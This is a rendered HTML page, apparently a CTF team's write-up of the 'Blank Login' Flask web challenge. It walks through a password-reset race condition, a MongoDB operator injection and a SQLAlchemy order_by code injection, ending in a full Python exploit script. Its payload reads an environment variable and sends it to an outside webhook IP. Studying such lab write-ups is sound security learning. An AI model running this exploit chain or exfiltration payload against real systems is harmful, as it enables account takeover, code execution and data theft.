@@ -1,0 +1,760 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+
+    <title>Blank Login - ByteTheCookies</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="ByteTheCookies" />
+    
+
+    
+        <meta property="og:url" content="http://localhost:1313/writeups/wwfctf2025/blank-login/">
+  <meta property="og:site_name" content="ByteTheCookies">
+  <meta property="og:title" content="Blank Login">
+  <meta property="og:description" content="Blank Login Description: Hm, I don’t remember, probably something about three databases.
+Introduction This is the third web application I’ve exploited. It’s a very cool challenge, not too complex, and very fun. There’s a not-very-easy race condition to spot. In fact, I think that’s the most difficult part. So, let’s start.
+We have a small Flask application with about 200 lines of code, so it’s not too bad. The first page is a login page without a register page.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Race Condition">
+    <meta property="article:tag" content="NoSQLI">
+    <meta property="article:tag" content="SqlAlchemy Injection">
+    <meta property="article:tag" content="499 Points">
+
+    
+
+    
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Blank Login">
+  <meta name="twitter:description" content="Blank Login Description: Hm, I don’t remember, probably something about three databases.
+Introduction This is the third web application I’ve exploited. It’s a very cool challenge, not too complex, and very fun. There’s a not-very-easy race condition to spot. In fact, I think that’s the most difficult part. So, let’s start.
+We have a small Flask application with about 200 lines of code, so it’s not too bad. The first page is a login page without a register page.">
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.js" integrity=""></script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/user.css">
+
+    
+
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li><li>
+                            <a href="/contacts/">✉️ Contacts</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">ByteTheCookies</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/contacts/" class="pure-menu-link">✉️ Contacts</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">web</div>
+
+  
+    <div class="badge">python</div>
+
+  
+    <div class="badge">Race Condition</div>
+
+  
+    <div class="badge">NoSQLI</div>
+
+  
+    <div class="badge">SqlAlchemy injection</div>
+
+  
+    <div class="badge">499 points</div>
+
+  
+    <div class="badge">17 solves</div>
+
+  
+    <div class="badge">spipm</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Jan 1, 1
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Blank Login</h1>
+<p><strong>Description</strong>: Hm, I don&rsquo;t remember, probably something about three databases.</p>
+
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>This is the third web application I&rsquo;ve exploited. It&rsquo;s a very cool challenge, not too complex, and very fun. There&rsquo;s a not-very-easy race condition to spot. In fact, I think that&rsquo;s the most difficult part. So, let&rsquo;s start.</p>
+<p>We have a small Flask application with about 200 lines of code, so it&rsquo;s not too bad. The first page is a login page without a register page.</p>
+<p>The first thing to do is read the code.</p>
+
+<h2 id="source" class="header-anchor-wrapper">Source
+  <a href="#source" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>We can start with the set up of the flask application</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: main.py
+
+# Flask setup - session store
+app = Flask(__name__)
+app.secret_key = bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex()
+app.config['SESSION_TYPE'] = 'filesystem'
+Session(app)
+
+# MongoDB setup - users
+mongo_client = MongoClient(&quot;mongodb://mongo:27017/&quot;)
+mongo_db = mongo_client[&quot;flaskdb&quot;]
+mongo_users = mongo_db[&quot;users&quot;]
+mongo_users.delete_many({})
+admin_user = {
+    &quot;username&quot;: &quot;admin&quot;,
+    &quot;password&quot;: bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex(),
+    &quot;email&quot;: &quot;admin@securepractice.corp&quot;
+}
+regular_user = {
+    &quot;username&quot;: &quot;user&quot;,
+    &quot;password&quot;: bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex(),
+    &quot;email&quot;: &quot;user@securepractice.corp&quot;
+}
+mongo_users.insert_many([admin_user, regular_user])
+
+# SQLite setup - audit trail
+Base = declarative_base()
+engine = create_engine(&quot;sqlite:///audit_log.db&quot;, connect_args={&quot;check_same_thread&quot;: False})
+SessionLocal = sessionmaker(bind=engine)
+
+class SearchBase(Base):
+    __tablename__ = &quot;search_base&quot;
+    id = Column(Integer, primary_key=True)
+
+class AuditLog(Base):
+    __tablename__ = &quot;audit_log&quot;
+    id = Column(Integer, primary_key=True)
+    parent_id = Column(Integer, ForeignKey(&quot;search_base.id&quot;))
+    username = Column(String)
+    action = Column(String)
+    timestamp = Column(Integer)
+
+
+# Other code....
+
+
+if __name__ == &quot;__main__&quot;:
+
+    Base.metadata.create_all(bind=engine)
+
+    # MySQL setup - reset tokens
+    for _ in range(10):
+        try:
+            mysql_conn = mysql.connector.connect(
+                host=&quot;mysql&quot;, user=&quot;root&quot;, password=&quot;rootpass&quot;, database=&quot;flaskdb&quot;
+            )
+            if mysql_conn.is_connected():
+                break
+        except Error:
+            time.sleep(3)
+    if not mysql_conn:
+        raise Exception(&quot;MySQL connection failed.&quot;)
+    # Reset token setup
+    cursor = mysql_conn.cursor(dictionary=True)
+    cursor.execute(&quot;&quot;&quot;
+        CREATE TABLE IF NOT EXISTS reset_tokens (
+            id INT AUTO_INCREMENT PRIMARY KEY,
+            username CHAR(255),
+            token CHAR(255) DEFAULT ''
+        ) CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci;
+    &quot;&quot;&quot;)
+    for username in ['user', 'admin']:
+        cursor.execute(&quot;DELETE FROM reset_tokens WHERE username = %s&quot;, (username,))
+        cursor.execute(&quot;INSERT INTO reset_tokens (username) VALUES (%s)&quot;, (username,))
+        cursor.execute(&quot;UPDATE reset_tokens SET token = %s WHERE username = %s&quot;, (get_random_token(), username))
+    mysql_conn.commit()
+    cursor.close()
+    mysql_conn.close()
+
+    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=False, threaded=True)
+</code></pre>
+<p>Okay, so analyzing the code, we have:</p>
+<ul>
+<li>Two registered a user: <code>user</code> and <code>admin</code>, with passwords that are securely and randomly generated.</li>
+<li>We use three databases, each with a specific purpose.
+<ul>
+<li>MySQL: Store the token for password resets.</li>
+<li>Mongo: Store users</li>
+<li>SQLite3: Store the audit logs.
+This is a bit strange, but okay.</li>
+</ul>
+</li>
+</ul>
+<p>Now, let&rsquo;s look at some endpoints.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">#filename: main.py
+
+# Main login page
+@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def login():
+    error = None
+    if request.method == &quot;POST&quot;:
+        username = request.form.get(&quot;username&quot;, &quot;&quot;).strip()
+        password = request.form.get(&quot;password&quot;, &quot;&quot;).strip()
+        if not re.fullmatch(r'^[\w@#$%^&amp;+=!]{1,64}$', password):
+            error = &quot;Invalid password format.&quot;
+        else:
+            user = mongo_users.find_one({&quot;username&quot;: username, &quot;password&quot;: password})
+            if user:
+                session[&quot;email&quot;] = user[&quot;email&quot;]
+                log_audit_event(username, &quot;login_success&quot;)
+                return redirect(&quot;/&quot;)
+            log_audit_event(username, &quot;login_failure&quot;)
+            error = &quot;Invalid credentials.&quot;
+    return render_template(&quot;login.html&quot;, error=error)
+
+# Allow users to change their email address
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def me():
+    if &quot;email&quot; not in session:
+        return redirect(&quot;/login&quot;)
+    current_email = session[&quot;email&quot;]
+    message = None
+    if request.method == &quot;POST&quot;:
+        # Validate email
+        new_email = request.get_json().get(&quot;new_email&quot;) if request.is_json else request.form.get(&quot;new_email&quot;)
+        if mongo_users.find_one({&quot;email&quot;: {&quot;$eq&quot;: new_email}}):
+            message = &quot;That email is already in use.&quot;
+        else:
+            # Update email address
+            result = mongo_users.update_one({&quot;email&quot;: current_email}, {&quot;$set&quot;: {&quot;email&quot;: new_email}})
+            if result.modified_count == 1:
+                session[&quot;email&quot;] = new_email
+                message = &quot;Email updated successfully&quot;
+            else:
+                message = &quot;Failed to update email.&quot;
+    return render_template(&quot;me.html&quot;, email=session[&quot;email&quot;], message=message)
+
+# Administrators can view the audit logs
+@app.route(&quot;/audit_logs&quot;, methods=[&quot;GET&quot;])
+def audit_logs():
+    if &quot;email&quot; not in session:
+        return redirect(&quot;/login&quot;)
+    user = mongo_users.find_one({&quot;email&quot;: session[&quot;email&quot;]})
+    if not user or user.get(&quot;username&quot;) != &quot;admin&quot;:
+        return &quot;Access denied&quot;, 403
+    order_by = request.args.get(&quot;order_by&quot;, &quot;timestamp&quot;)
+    if not any(order_by.startswith(col) for col in ['username', 'action', 'timestamp']):
+        order_by = &quot;timestamp&quot;
+    SearchBase.logs = relationship(&quot;AuditLog&quot;, order_by=f'AuditLog.{order_by}')
+    db = SessionLocal()
+    bases = db.query(SearchBase).all()
+    logs = [log for base in bases for log in base.logs]
+    db.close()
+    return render_template(&quot;audit_logs.html&quot;, logs=logs)
+
+# Users can request a new password
+@app.route(&quot;/reset_request&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def reset_request():
+    message = None
+    if request.method == &quot;POST&quot;:
+        # Validate username
+        username = request.form.get(&quot;username&quot;, &quot;&quot;).strip()
+        if not username:
+            message = &quot;Username is required.&quot;
+        elif not username.isalnum():
+            message = &quot;Invalid username&quot;
+        elif 'admin' in username.lower():
+            message = &quot;Reset not allowed for admin&quot;
+        # Get user
+        elif (user := mongo_users.find_one({&quot;username&quot;: username})):
+            conn = get_db()
+            cursor = conn.cursor()
+            try:
+                # Remove all old entries
+                cursor.execute(&quot;DELETE FROM reset_tokens WHERE username = %s&quot;, (username,))
+                conn.commit()
+                # Create new entry
+                cursor.execute(&quot;INSERT INTO reset_tokens (username) VALUES (%s)&quot;, (username,))
+                conn.commit()
+                # Set new token
+                cursor.execute(&quot;UPDATE reset_tokens SET token = %s WHERE username = %s&quot;, (get_random_token(), username))
+                conn.commit()
+                message = &quot;Reset email sent.&quot; # Backend job sends the reset email
+            except:
+                message = &quot;Unhandled failure.&quot;
+            finally:
+                cursor.close()
+        else:
+            message = &quot;User not found.&quot;
+        return render_template(&quot;result.html&quot;, message=message)
+    return render_template(&quot;reset_request.html&quot;)
+
+# Users can set a new password with a valid reset token
+@app.route(&quot;/reset&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def reset():
+    message = None
+    if request.method == &quot;POST&quot;:
+        # Validate password and token
+        token = request.form.get(&quot;token&quot;, &quot;&quot;)
+        new_password = request.form.get(&quot;new_password&quot;, &quot;&quot;)
+        if not re.fullmatch(r'^[\w@#$%^&amp;+=!]{6,64}$', new_password):
+            message = &quot;Invalid password format.&quot;
+        elif not token or len(token) &lt; 16:
+            message = &quot;Invalid token format.&quot;
+        else:
+            # Get user for token
+            conn = get_db()
+            cursor = conn.cursor(dictionary=True)
+            cursor.execute(&quot;SELECT * FROM reset_tokens WHERE token = %s&quot;, (token,))
+            row = cursor.fetchone()
+            cursor.close()
+            if row:
+                # Reset user password
+                username = row[&quot;username&quot;].strip()
+                mongo_users.update_one({&quot;username&quot;: username}, {&quot;$set&quot;: {&quot;password&quot;: new_password}})
+                cursor = conn.cursor()
+                cursor.execute(&quot;DELETE FROM reset_tokens WHERE username = %s&quot;, (username,))
+                conn.commit()
+                cursor.close()
+                message = f&quot;Password updated&quot;
+            else:
+                message = &quot;Invalid token.&quot;
+        return render_template(&quot;result.html&quot;, message=message)
+    return render_template(&quot;reset.html&quot;)
+</code></pre>
+<p>We have some cool endpoints:</p>
+<ol>
+<li><code>/</code>: Main route a route to change your email address while logged in.</li>
+<li><code>/login</code>: Pretty clear.</li>
+<li><code>/audit_logs</code>: An admin endpoint to view all audit logs.</li>
+<li><code>/reset_request</code>: Reset password request by username.</li>
+<li><code>/reset</code>: Resets the password using the username and token.</li>
+</ol>
+<p>I think it&rsquo;s pretty straightforward, don&rsquo;t you?</p>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>The first step is to search for the <em>flag</em> position. In this case, it is in an <code>env variable</code>.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-yaml">  web:
+    build: .
+    ports:
+      - &quot;5000:5000&quot;
+    depends_on:
+      - mongo
+      - mysql
+    environment:
+      - FLASK_ENV=production
+      - FLAG=wwf{not_the_flag}
+</code></pre>
+<p>Okay, so the goal is to get RCE. The first thing to do is to check for SSTI, but that&rsquo;s not the case here.</p>
+<p>Now, the most difficult part is checking all the code. The most suspicious things are:</p>
+<ol>
+<li>NoSQL injection in the reset email form.</li>
+</ol>
+<pre  class="mc-prism hide language-text" ><code class="language-python">new_email = request.get_json().get(&quot;new_email&quot;) if request.is_json else request.form.get(&quot;new_email&quot;)
+</code></pre>
+<p>The line is bad because if we pass the header JSON, it passes all the objects, not just a string.</p>
+<ol start="2">
+<li>It&rsquo;s a sort of code injection in the SQLAlchemy function in the audit logs endpoint.</li>
+</ol>
+<pre  class="mc-prism hide language-text" ><code class="language-python">    if not any(order_by.startswith(col) for col in ['username', 'action', 'timestamp']):
+        order_by = &quot;timestamp&quot;
+    SearchBase.logs = relationship(&quot;AuditLog&quot;, order_by=f'AuditLog.{order_by}') # Not very good
+    db = SessionLocal()
+    bases = db.query(SearchBase).all()
+</code></pre>
+<p>Okay, nice. We have a code injection. Is that all? No, because to get access to the endpoint, we have to become an admin. We don&rsquo;t have a login for the user account, so it&rsquo;s pretty useless.</p>
+<p>After much trial and error, I discovered a cool race condition between the <code>/reset_request</code> and <code>/reset</code> endpoints.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># Users can request a new password
+@app.route(&quot;/reset_request&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def reset_request():
+    message = None
+    if request.method == &quot;POST&quot;:
+        # Validate username
+        username = request.form.get(&quot;username&quot;, &quot;&quot;).strip()
+        if not username:
+            message = &quot;Username is required.&quot;
+        elif not username.isalnum():
+            message = &quot;Invalid username&quot;
+        elif 'admin' in username.lower():
+            message = &quot;Reset not allowed for admin&quot;
+        # Get user
+        elif (user := mongo_users.find_one({&quot;username&quot;: username})):
+            conn = get_db()
+            cursor = conn.cursor()
+            try:
+                # Remove all old entries
+                cursor.execute(&quot;DELETE FROM reset_tokens WHERE username = %s&quot;, (username,))
+                conn.commit()
+                # Create new entry
+                cursor.execute(&quot;INSERT INTO reset_tokens (username) VALUES (%s)&quot;, (username,))
+                conn.commit()
+                # Set new token
+                cursor.execute(&quot;UPDATE reset_tokens SET token = %s WHERE username = %s&quot;, (get_random_token(), username))
+                conn.commit()
+                message = &quot;Reset email sent.&quot; # Backend job sends the reset email
+            except:
+                message = &quot;Unhandled failure.&quot;
+            finally:
+                cursor.close()
+        else:
+            message = &quot;User not found.&quot;
+        return render_template(&quot;result.html&quot;, message=message)
+    return render_template(&quot;reset_request.html&quot;)
+</code></pre>
+<p>When we make a reset request, the server makes three different commits, one for each query. In this case, it&rsquo;s very bad because there&rsquo;s a moment when the token is equal to an empty string. Especially, the database is set to <code>CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci</code>, so spaces are trimmed from the query.</p>
+<p>We can basically make a <code>/reset</code> request and, at the same time, make a <code>/reset_request</code>. This allows us to change the password of ONLY the user (because the admin is blocked) and log in.</p>
+<p>Okay, but how can we log in as an admin? Easy. Remember the NoSQLi we can use to bypass the admin check in the <code>/audit_logs</code> endpoint with a basic logic injection: <code>{ &quot;$gt&quot;: &quot;&quot;}</code> (This is a possible payload.) We can inject the payload thanks to the email change.</p>
+<p>Now, if we try to make a GET request to <code>/audit_logs</code>, we have access, and we can make the code injections.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
+#!/usr/bin/python3
+import random
+import string
+import threading
+import urllib.parse
+import requests
+
+BASE_URL = &quot;https://{instance_id}.chall.wwctf.com&quot;
+WEBHOOK_URL = &quot;http://178.63.67.153/eb3102da-b96c-48b5-92c9-d59301574330/&quot;
+
+s = requests.Session()
+
+
+payload_spaces = &quot; &quot; * 32
+token_field   = urllib.parse.quote_plus(payload_spaces)
+new_pass      = &quot;cookie&quot;
+
+def spam_reset_request():
+    while True:
+        s.post(f&quot;{BASE_URL}/reset_request&quot;,
+                      data={&quot;username&quot;: &quot;user&quot;},
+                      timeout=3)
+
+def race_reset():
+    while True:
+        data = {&quot;token&quot;: payload_spaces, &quot;new_password&quot;: new_pass}
+        r = s.post(f&quot;{BASE_URL}/reset&quot;, data=data, timeout=3)
+        if &quot;Password updated&quot; in r.text:
+            print(&quot;[+] Race WON!&quot;)
+            break
+
+def login():
+    data = {&quot;username&quot;: &quot;user&quot;, &quot;password&quot;: new_pass}
+    r = s.post(f&quot;{BASE_URL}/login&quot;, data=data)
+    if &quot;New Email&quot; in r.text:
+        print(&quot;[+] Logged in successfully!&quot;)
+    else:
+        print(&quot;[-] Failed to log in.&quot;)
+
+def update_email():
+    data = {&quot;new_email&quot;:  { &quot;$gt&quot;: &quot;&quot; }}
+    r = s.post(f&quot;{BASE_URL}&quot;, json=data)
+    if &quot;Email updated successfully&quot; in r.text:
+        print(&quot;[+] Email updated successfully!&quot;)
+    else:
+        print(&quot;[-] Failed to update email.&quot;)
+
+
+def audit_logs():
+    payload = f&quot;(__import__('urllib.request', fromlist=['urlopen']).urlopen('{WEBHOOK_URL}?f='+(__import__('os').getenv('FLAG','NF'))))&quot;
+    r = s.get(f&quot;{BASE_URL}/audit_logs&quot;,params={&quot;order_by&quot;: f&quot;timestamp.desc(),{payload}&quot;})
+    if &quot;Access denied&quot; in r.text:
+        print(&quot;[-] Access denied to audit logs.&quot;)
+    else:
+        print(&quot;[+] Audit logs accessed successfully!&quot;)
+        print(r.text)
+
+def main():
+    threading.Thread(target=spam_reset_request, daemon=True).start()
+    race_reset()
+    login()
+    update_email()
+    audit_logs()
+
+
+
+if __name__ == &quot;__main__&quot;:
+	main()
+
+
+# goodluck by @akiidjk
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag:  wwf{Ju57_G1v3_mE_S0m3_5p4ce}
+</code></pre>
+<p align='right'>Author: akiidjk <p>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2024 by ByteTheCookies Team | v1.0</article>
+</footer>
+
+</body>
+</html>
